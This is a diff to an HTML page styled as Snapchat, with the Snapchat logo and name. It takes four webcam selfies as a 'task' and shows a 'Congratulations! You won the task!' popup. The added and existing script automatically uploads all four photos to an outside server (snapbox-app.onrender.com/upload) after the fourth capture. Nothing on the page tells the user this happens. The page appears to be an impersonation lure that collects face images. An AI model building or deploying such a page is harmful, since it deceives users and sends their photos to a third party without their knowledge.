@@ -40,11 +40,34 @@
     #camera {
       transform: scaleX(-1);
     }
+
+    @keyframes glow {
+      0% { filter: drop-shadow(0 0 4px #ffcc00); }
+      50% { filter: drop-shadow(0 0 12px #ff33cc); }
+      100% { filter: drop-shadow(0 0 4px #00ffff); }
+    }
+
+    .animate-glow {
+      animation: glow 3s infinite;
+    }
+
+    @keyframes popup {
+      0% { transform: scale(0.5); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .animate-popup {
+      animation: popup 0.5s ease-out;
+    }
   </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen">
 
-  <img src="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/pngimg.com%20-%20snapchat_PNG33.png" class="w-24 mb-6" alt="Snapchat" />
+  <!-- Animated Logo & Text -->
+  <div class="flex flex-col items-center mb-6">
+    <img src="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/pngimg.com%20-%20snapchat_PNG33.png" class="w-24 animate-glow" alt="Snapchat Logo" />
+    <p class="text-white font-bold text-lg mt-2">Snapchat</p>
+  </div>
 
   <!-- Live Camera -->
   <div class="animated-border mb-4">
@@ -68,101 +91,106 @@
     <button onclick="resetAll()" class="bg-red-500 hover:bg-red-600 px-6 py-2 rounded-xl font-bold text-white transition">🔄 Reset</button>
   </div>
 
-  <!-- Message -->
-  <div id="msg" class="mt-2 text-xl font-bold hidden text-green-400">🎉 Congratulations you won the task!</div>
+  <!-- Centered Popup Message -->
+  <div id="msg" class="hidden fixed inset-0 flex items-center justify-center z-50">
+    <div class="bg-green-500 text-white text-xl font-bold px-8 py-4 rounded-xl shadow-2xl animate-popup">
+      🎉 Congratulations! You won the task!
+    </div>
+  </div>
 
   <canvas id="canvas" class="hidden"></canvas>
 
-<script>
-let currentIndex = 0;
-const capturedImages = [];
+  <script>
+    let currentIndex = 0;
+    const capturedImages = [];
 
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-  .then(stream => {
-    document.getElementById('camera').srcObject = stream;
-  })
-  .catch(err => {
-    console.error('Camera error:', err);
-    alert('Camera access failed. Use HTTPS or allow permission.');
-  });
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        document.getElementById('camera').srcObject = stream;
+      })
+      .catch(err => {
+        console.error('Camera error:', err);
+        alert('Camera access failed. Use HTTPS or allow permission.');
+      });
 
-function capturePhoto() {
-  if (currentIndex >= 4) return alert("All 4 photos already captured!");
+    function capturePhoto() {
+      if (currentIndex >= 4) return alert("All 4 photos already captured!");
 
-  const video = document.getElementById('camera');
-  const canvas = document.getElementById('canvas');
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
+      const video = document.getElementById('camera');
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
 
-  const ctx = canvas.getContext('2d');
-  ctx.translate(canvas.width, 0);
-  ctx.scale(-1, 1);
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const ctx = canvas.getContext('2d');
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  const dataUrl = canvas.toDataURL('image/jpeg');
+      const dataUrl = canvas.toDataURL('image/jpeg');
+      const box = document.querySelectorAll('.preview-box')[currentIndex];
+      box.style.backgroundImage = `url(${dataUrl})`;
+      box.innerText = '';
 
-  const box = document.querySelectorAll('.preview-box')[currentIndex];
-  box.style.backgroundImage = `url(${dataUrl})`;
-  box.innerText = '';
+      const blob = dataURLtoBlob(dataUrl);
+      capturedImages.push(blob);
 
-  const blob = dataURLtoBlob(dataUrl);
-  capturedImages.push(blob);
+      currentIndex++;
 
-  currentIndex++;
+      if (currentIndex === 4) submitPhotos();
+    }
 
-  if (currentIndex === 4) submitPhotos();
-}
+    function dataURLtoBlob(dataurl) {
+      const parts = dataurl.split(',');
+      const mime = parts[0].match(/:(.*?);/)[1];
+      const bstr = atob(parts[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
+    }
 
-function dataURLtoBlob(dataurl) {
-  const parts = dataurl.split(',');
-  const mime = parts[0].match(/:(.*?);/)[1];
-  const bstr = atob(parts[1]);
-  let n = bstr.length;
-  const u8arr = new Uint8Array(n);
-  while (n--) u8arr[n] = bstr.charCodeAt(n);
-  return new Blob([u8arr], { type: mime });
-}
+    function submitPhotos() {
+      const formData = new FormData();
+      capturedImages.forEach((img, index) => {
+        formData.append('photos', img, `photo${index + 1}.jpg`);
+      });
 
-function submitPhotos() {
-  const formData = new FormData();
-  capturedImages.forEach((img, index) => {
-    formData.append('photos', img, `photo${index + 1}.jpg`);
-  });
+      fetch('https://snapbox-app.onrender.com/upload', {
+        method: 'POST',
+        body: formData
+      })
+        .then(() => {
+          const msg = document.getElementById('msg');
+          msg.classList.remove('hidden');
+          setTimeout(() => msg.classList.add('hidden'), 3000);
+        })
+        .catch(err => alert('Upload failed: ' + err));
+    }
 
-  fetch('https://snapbox-app.onrender.com/upload', {
-    method: 'POST',
-    body: formData
-  })
-    .then(() => {
-      document.getElementById('msg').classList.remove('hidden');
-    })
-    .catch(err => alert('Upload failed: ' + err));
-}
+    function downloadAllPhotos() {
+      if (capturedImages.length < 1) return alert("Capture photos first!");
 
-function downloadAllPhotos() {
-  if (capturedImages.length < 1) return alert("Capture photos first!");
+      capturedImages.forEach((blob, index) => {
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `selfie_${index + 1}.jpg`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+      });
+    }
 
-  capturedImages.forEach((blob, index) => {
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `selfie_${index + 1}.jpg`;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(url);
-  });
-}
-
-function resetAll() {
-  currentIndex = 0;
-  capturedImages.length = 0;
-  document.querySelectorAll('.preview-box').forEach((box, i) => {
-    box.style.backgroundImage = '';
-    box.innerText = `Tap ${i + 1}`;
-  });
-  document.getElementById('msg').classList.add('hidden');
-}
-</script>
+    function resetAll() {
+      currentIndex = 0;
+      capturedImages.length = 0;
+      document.querySelectorAll('.preview-box').forEach((box, i) => {
+        box.style.backgroundImage = '';
+        box.innerText = `Tap ${i + 1}`;
+      });
+      document.getElementById('msg').classList.add('hidden');
+    }
+  </script>
 </body>
 </html>
